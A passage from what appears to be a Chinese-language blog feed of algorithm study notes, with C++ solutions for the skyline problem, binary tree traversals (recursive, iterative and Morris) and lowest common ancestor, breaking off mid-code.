<p>类似于单调栈，移除无用元素</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">getSkyline</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;buildings) &#123;</span><br><span class="line">        <span class="type">int</span> n = buildings.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">typedef</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; pii;</span><br><span class="line">        <span class="comment">// 高度，右侧边界</span></span><br><span class="line">        priority_queue&lt;pii, vector&lt;pii&gt;, less&lt;&gt;&gt; maxHeap;</span><br><span class="line"></span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; ans;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> cur_x, cur_h = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n || !maxHeap.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (maxHeap.<span class="built_in">empty</span>() ||</span><br><span class="line">                (i &lt; n &amp;&amp; buildings[i][<span class="number">0</span>] &lt;= -maxHeap.<span class="built_in">top</span>().second)) &#123;</span><br><span class="line">                cur_x = buildings[i][<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">while</span> (i &lt; n &amp;&amp; buildings[i][<span class="number">0</span>] &lt;= cur_x) &#123;</span><br><span class="line">                    maxHeap.<span class="built_in">push</span>(&#123;buildings[i][<span class="number">2</span>], -buildings[i][<span class="number">1</span>]&#125;);</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 插入节点导致高度变高</span></span><br><span class="line">                <span class="keyword">if</span> (maxHeap.<span class="built_in">top</span>().first &gt; cur_h) &#123;</span><br><span class="line">                    cur_h = maxHeap.<span class="built_in">top</span>().first;</span><br><span class="line">                    ans.<span class="built_in">push_back</span>(&#123;cur_x, cur_h&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// maxHeap.push(&#123;buildings[i][2], -buildings[i][1]&#125;);</span></span><br><span class="line">                <span class="comment">// i++;</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cur_x = -maxHeap.<span class="built_in">top</span>().second;</span><br><span class="line">                maxHeap.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 把所有&lt;=cur_x的全部弹出</span></span><br><span class="line">                <span class="keyword">while</span> (!maxHeap.<span class="built_in">empty</span>() &amp;&amp; -maxHeap.<span class="built_in">top</span>().second &lt;= cur_x)</span><br><span class="line">                    maxHeap.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (maxHeap.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                    ans.<span class="built_in">push_back</span>(&#123;cur_x, <span class="number">0</span>&#125;);</span><br><span class="line">                    cur_h = <span class="number">0</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (maxHeap.<span class="built_in">top</span>().first &lt; cur_h) &#123;</span><br><span class="line">                    cur_h = maxHeap.<span class="built_in">top</span>().first;</span><br><span class="line">                    ans.<span class="built_in">push_back</span>(&#123;cur_x, cur_h&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
  </entry>
  <entry>
    <title></title>
    <url>/2023/06/12/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1>一、绪论</h1>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/img/202206021858714.jpg" alt="123"></p>
<h2 id="数据结构">数据结构</h2>
<p>Data_Structure=(D,S)</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.png" alt="数据结构"></p>
<h2 id="抽象数据类型">抽象数据类型</h2>
<blockquote>
<p>Abstract Data Type, ADT</p>
<p>(D, S, P)</p>
</blockquote>
<h1>算法</h1>
<h2 id="枚举">枚举</h2>
<p>遇到影响全局的操作，一般会想到枚举操作次数。</p>
<h2 id="二分查找">二分查找</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>最小化最大值、最大化最小值</p>
</li>
<li class="lvl-2">
<p>有序数组查找目标值</p>
</li>
</ul>
<h2 id="动态规划">动态规划</h2>
<blockquote>
<p>方案数</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>树：二叉树</title>
    <url>/2023/09/05/%E7%AE%97%E6%B3%95/%E6%A0%91%EF%BC%9A%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<h1>二叉树</h1>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TreeNode</span> &#123; <span class="type">int</span> val;</span><br><span class="line">TreeNode *left;</span><br><span class="line">TreeNode *right;</span><br><span class="line"><span class="built_in">TreeNode</span>(<span class="type">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">left</span>(<span class="literal">NULL</span>), <span class="built_in">right</span>(<span class="literal">NULL</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>完全二叉树是由满二叉树而引出来的，若设二叉树的<code>深度为h</code>，<code>除第 h 层外</code>，<code>其它各层 (1～h-1) 的结点数都达到最大个数(即1~h-1层为一个满二叉树)</code>，第 h 层所有的结点都连续集中在最左边，这就是完全二叉树。</p>
<h1>树的遍历：先根、中根、后根、层次</h1>
<h2 id="先根遍历-preorder">先根遍历(preorder)</h2>
<h3 id="递归">递归</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">preorder</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    ans.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">    <span class="built_in">preorder</span>(root-&gt;left);</span><br><span class="line">    <span class="built_in">preorder</span>(root-&gt;right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="迭代">迭代</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">    stack&lt;TreeNode*&gt; stk;</span><br><span class="line">    <span class="keyword">while</span>(!stk.<span class="built_in">empty</span>()||root)&#123;</span><br><span class="line">        <span class="comment">// 沿着左子树下降</span></span><br><span class="line">        <span class="keyword">while</span>(root)&#123;</span><br><span class="line">            ans.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">            stk.<span class="built_in">push</span>(root);</span><br><span class="line">            root=root-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">        root=stk.<span class="built_in">top</span>();</span><br><span class="line">        stk.<span class="built_in">pop</span>();</span><br><span class="line">        root=root-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        stack&lt;TreeNode *&gt; stk;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">while</span>(root!=<span class="literal">nullptr</span>||!stk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="keyword">while</span>(root==<span class="literal">nullptr</span>&amp;&amp;!stk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                root=stk.<span class="built_in">top</span>();</span><br><span class="line">                root=root-&gt;right;    </span><br><span class="line">                stk.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(root)&#123;</span><br><span class="line">            ans.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">            stk.<span class="built_in">push</span>(root);</span><br><span class="line">            root=root-&gt;left;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//N叉树</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preorder</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> ans;</span><br><span class="line">        stack&lt;Node*&gt; stk;</span><br><span class="line">        stk.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span>(!stk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            Node* cur=stk.<span class="built_in">top</span>();</span><br><span class="line">            stk.<span class="built_in">pop</span>();</span><br><span class="line">            ans.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=cur-&gt;children.<span class="built_in">size</span>()<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">                stk.<span class="built_in">push</span>(cur-&gt;children[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><a href="https://leetcode.cn/problems/n-ary-tree-preorder-traversal/description/?envType=daily-question&amp;envId=2024-02-18">589. N 叉树的前序遍历 - 力扣（LeetCode）</a></p>
<h3 id="Mirros遍历">Mirros遍历</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">        TreeNode* predesessor;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(root)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root-&gt;left!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">                predesessor=root-&gt;left;</span><br><span class="line">                <span class="keyword">while</span>(predesessor-&gt;right&amp;&amp;predesessor-&gt;right!=root)&#123;</span><br><span class="line">                    predesessor=predesessor-&gt;right;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(predesessor-&gt;right!=root)&#123;</span><br><span class="line">                    predesessor-&gt;right=root;</span><br><span class="line">                    ans.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">                    root=root-&gt;left;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                     predesessor-&gt;right=<span class="literal">nullptr</span>;</span><br><span class="line">                    root=root-&gt;right;</span><br><span class="line">                   </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ans.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">                root=root-&gt;right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="中根遍历-inorder">中根遍历(inorder)</h2>
<p><a href="https://leetcode.cn/problems/binary-tree-inorder-traversal/solution/er-cha-shu-de-zhong-xu-bian-li-by-leetcode-solutio/">二叉树的中序遍历 - 二叉树的中序遍历 - 力扣（LeetCode）</a></p>
<h3 id="递归-2">递归</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">inorder</span>(root)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">inorder</span>(root-&gt;left);</span><br><span class="line">    处理根结点</span><br><span class="line">    <span class="built_in">inorder</span>(root-&gt;right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>时间复杂度：O(n)，其中 n为二叉树节点的个数。二叉树的遍历中每个节点会被访问一次且只会被访问一次。</p>
<p>空间复杂度：O(n)。空间复杂度取决于递归的栈深度，而栈深度在二叉树为一条链的情况下会达到 O(n)的级别。</p>
</blockquote>
<h3 id="迭代-2">迭代</h3>
<p><code>沿着左侧路径下降，访问该结点，转到右侧路径</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; ret;</span><br><span class="line">        stack&lt;TreeNode*&gt; stk;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(root||!stk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="comment">//沿着左子树下降</span></span><br><span class="line">            <span class="keyword">while</span>(root)&#123;</span><br><span class="line">                stk.<span class="built_in">push</span>(root);</span><br><span class="line">                root=root-&gt;left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//弹出最后的左子节点，访问，接下来访问右子树</span></span><br><span class="line">            root=stk.<span class="built_in">top</span>();</span><br><span class="line">            stk.<span class="built_in">pop</span>();</span><br><span class="line">            ret.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">            root=root-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>时间复杂度：O(n)，其中 n为二叉树节点的个数。二叉树的遍历中每个节点会被访问一次且只会被访问一次。</p>
<p>空间复杂度：O(n)。空间复杂度取决于递归的栈深度，而栈深度在二叉树为一条链的情况下会达到 O(n)的级别。</p>
</blockquote>
<h3 id="Morris遍历">Morris遍历</h3>
<blockquote>
<p>mirros记录了一条返回路径，可以通过该路径访问到下一个应该访问的节点</p>
<p>root沿着左子树下降，并记录左子树最右侧节点返回到当前节点的路径</p>
<p>访问完root的左子树后，应该返回到root</p>
<p>如果左子树的最右侧节点已经指向了自身，说明左子树已经遍历结束，当前遍历根节点，转向右子树</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202307281711793.png" alt="image-20230728171105746"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; ret;</span><br><span class="line">        TreeNode *predesessor;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(root!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="comment">//左子树不为空，寻找左子树的最右结点</span></span><br><span class="line">            <span class="keyword">if</span>(root-&gt;left!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">                predesessor=root-&gt;left;</span><br><span class="line">                <span class="keyword">while</span>(predesessor-&gt;right!=<span class="literal">nullptr</span>&amp;&amp;predesessor-&gt;right!=root)&#123;</span><br><span class="line">                    predesessor=predesessor-&gt;right;</span><br><span class="line">                &#125;</span><br><span class="line">				</span><br><span class="line">                <span class="comment">//判断最右结点是否访问过</span></span><br><span class="line">                <span class="keyword">if</span>(predesessor-&gt;right!=root)&#123;</span><br><span class="line">                    predesessor-&gt;right=root;</span><br><span class="line">                    root=root-&gt;left;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    ret.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">                    predesessor-&gt;right=<span class="literal">nullptr</span>;</span><br><span class="line">                    root=root-&gt;right;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//左子树为空</span></span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                ret.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">                root=root-&gt;right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="后根遍历">后根遍历</h2>
<h3 id="递归-3">递归</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">inorder</span>(root)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">inorder</span>(root-&gt;left);</span><br><span class="line">    <span class="built_in">inorder</span>(root-&gt;right);</span><br><span class="line">    处理根结点</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="迭代-3">迭代</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">        stack&lt;pair&lt;TreeNode*,<span class="type">int</span>&gt;&gt; stk;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(root||!stk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="comment">//沿着左子树下降</span></span><br><span class="line">            <span class="keyword">while</span>(root)&#123;</span><br><span class="line">                stk.<span class="built_in">push</span>(&#123;root,<span class="number">-1</span>&#125;);</span><br><span class="line">                root=root-&gt;left;</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">//auto [root,mark]=stk.top()，错误，新建了一个临时root变量</span></span><br><span class="line">            root=stk.<span class="built_in">top</span>().first;</span><br><span class="line">            <span class="type">int</span> mark=stk.<span class="built_in">top</span>().second;</span><br><span class="line">            stk.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="comment">//右子树还未访问</span></span><br><span class="line">            <span class="keyword">if</span>(mark==<span class="number">-1</span>)&#123;</span><br><span class="line">                stk.<span class="built_in">push</span>(&#123;root,<span class="number">0</span>&#125;);</span><br><span class="line">                root=root-&gt;right;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ans.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">                <span class="comment">//下面将指针置为null</span></span><br><span class="line">                root=<span class="literal">nullptr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        stack&lt;TreeNode *&gt; stk;</span><br><span class="line">        TreeNode *prev = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">while</span> (root != <span class="literal">nullptr</span> || !stk.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">while</span> (root != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                stk.<span class="built_in">emplace</span>(root);</span><br><span class="line">                root = root-&gt;left;</span><br><span class="line">            &#125;</span><br><span class="line">            root = stk.<span class="built_in">top</span>();</span><br><span class="line">            stk.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="comment">//root的right节点为其右子节点，则右子树已经遍历过</span></span><br><span class="line">            <span class="keyword">if</span> (root-&gt;right == <span class="literal">nullptr</span> || root-&gt;right == prev) &#123;</span><br><span class="line">                res.<span class="built_in">emplace_back</span>(root-&gt;val);</span><br><span class="line">                prev = root;</span><br><span class="line">                root = <span class="literal">nullptr</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                stk.<span class="built_in">emplace</span>(root);</span><br><span class="line">                root = root-&gt;right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="Mirros遍历-2">Mirros遍历</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">        TreeNode* n=root;</span><br><span class="line">        <span class="keyword">while</span>(root)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root-&gt;left)&#123;</span><br><span class="line">                TreeNode* predecessor=root-&gt;left;</span><br><span class="line">                <span class="keyword">while</span>(predecessor-&gt;right&amp;&amp;predecessor-&gt;right!=root)&#123;</span><br><span class="line">                    predecessor=predecessor-&gt;right;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(predecessor-&gt;right==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">                    predecessor-&gt;right=root;</span><br><span class="line">                    root=root-&gt;left;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    predecessor-&gt;right=<span class="literal">nullptr</span>;</span><br><span class="line">                    <span class="built_in">addPath</span>(root-&gt;left,ans);</span><br><span class="line">                    root=root-&gt;right;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                root=root-&gt;right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">addPath</span>(n,ans);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addPath</span><span class="params">(TreeNode* root,vector&lt;<span class="type">int</span>&gt; &amp;ans)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(root)&#123;</span><br><span class="line">            ans.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">            root=root-&gt;right;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(ans.<span class="built_in">end</span>()-count,ans.<span class="built_in">end</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="Mirros遍历比较">Mirros遍历比较</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202309131602611.png" alt="202203231116998.png"><br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic/202203231121195.png" alt="image-20220323112113166"></p>
<h1>LCA(<em>latest</em> common ancestor)</h1>
<p><a href="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-tree/">236. 二叉树的最近公共祖先</a>方法一</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    TreeNode *ans;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//当前节点满足，记录下答案</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">DFS</span>(root,p)&amp;&amp;<span class="built_in">DFS</span>(root,q))&#123;</span><br><span class="line">            ans=root;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">//左侧不满足，查找右侧</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">lowestCommonAncestor</span>(root-&gt;left,p,q)==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">lowestCommonAncestor</span>(root-&gt;right,p,q);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从root是否可以到达target</span></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">DFS</span><span class="params">(TreeNode* root,TreeNode *target)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root==target)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">DFS</span>(root-&gt;left,target)||<span class="built_in">DFS</span>(root-&gt;right,target);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>方法二</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//先递归，再判断</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        TreeNode*l=<span class="built_in">lowestCommonAncestor</span>(root-&gt;left,p,q);</span><br><span class="line">        <span class="keyword">if</span>(l!=<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> l; </span><br><span class="line">        TreeNode*r= <span class="built_in">lowestCommonAncestor</span>(root-&gt;right,p,q);</span><br><span class="line">        <span class="keyword">if</span>(r!=<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> r;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">check</span>(root,p)&amp;&amp;<span class="built_in">check</span>(root,q))</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(TreeNode* root,TreeNode *p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(root==p)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">check</span>(root-&gt;left,p)||<span class="built_in">check</span>(root-&gt;right,p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>方法三</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  TreeNode *ans;</span><br><span class="line">  <span class="function">TreeNode *<span class="title">lowestCommonAncestor</span><span class="params">(TreeNode *root, TreeNode *p, TreeNode *q)</span> </span>&#123;</span><br><span class="line">      <span class="built_in">DFS</span>(root,p,q);</span><br><span class="line">      <span class="keyword">return</span> ans;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">DFS</span><span class="params">(TreeNode *root, TreeNode *p, TreeNode *q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">bool</span> lson = <span class="built_in">DFS</span>(root-&gt;left, p, q);</span><br><span class="line">    <span class="type">bool</span> rson = <span class="built_in">DFS</span>(root-&gt;right, p, q);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((lson&amp;&amp;rson)||((root==p||root==q)&amp;&amp;(lson||rson)))&#123;</span><br><span class="line">        ans 